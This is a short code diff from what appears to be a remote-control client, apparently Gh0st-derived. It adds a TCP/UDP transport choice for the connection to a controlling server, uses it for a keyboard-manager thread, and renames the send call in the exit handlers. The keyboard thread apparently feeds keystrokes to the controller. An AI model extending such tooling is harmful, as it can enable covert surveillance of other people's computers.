@@ -13,11 +13,22 @@
 #include "common/dllRunner.h"
 #include "server/2015Remote/pwd_gen.h"
 #include <common/iniFile.h>
+#include "IOCPUDPClient.h"
+
+// UDP 协议仅能针对小包数据，且数据没有时序关联
+IOCPClient* NewNetClient(CONNECT_ADDRESS* conn, State& bExit, bool exit_while_disconnect) {
+	if (conn->protoType == PROTO_TCP)
+		return new IOCPClient(bExit, exit_while_disconnect);
+	if (conn->protoType == PROTO_UDP)
+		return new IOCPUDPClient(bExit, exit_while_disconnect);
+
+	return NULL;
+}
 
 ThreadInfo* CreateKB(CONNECT_ADDRESS* conn, State& bExit) {
 	static ThreadInfo tKeyboard;
 	tKeyboard.run = FOREVER_RUN;
-	tKeyboard.p = new IOCPClient(bExit, false);
+	tKeyboard.p = NewNetClient(conn, bExit, false);
 	tKeyboard.conn = conn;
 	tKeyboard.h = (HANDLE)CreateThread(NULL, NULL, LoopKeyboardManager, &tKeyboard, 0, NULL);
 	return &tKeyboard;
@@ -350,7 +361,7 @@ VOID CKernelManager::OnReceive(PBYTE szBuffer, ULONG ulLength)
 	case COMMAND_BYE:
 		{
 			BYTE	bToken = COMMAND_BYE;// 被控端退出
-			m_ClientObject->OnServerSending((char*)&bToken, 1);
+			m_ClientObject->Send2Server((char*)&bToken, 1);
 			g_bExit = S_CLIENT_EXIT;
 			Mprintf("======> Client exit \n");
 			break;
@@ -359,7 +370,7 @@ VOID CKernelManager::OnReceive(PBYTE szBuffer, ULONG ulLength)
 	case SERVER_EXIT:
 		{
 			BYTE	bToken = SERVER_EXIT;// 主控端退出  
-			m_ClientObject->OnServerSending((char*)&bToken, 1);
+			m_ClientObject->Send2Server((char*)&bToken, 1);
 			g_bExit = S_SERVER_EXIT;
 			Mprintf("======> Server exit \n");
 			break;
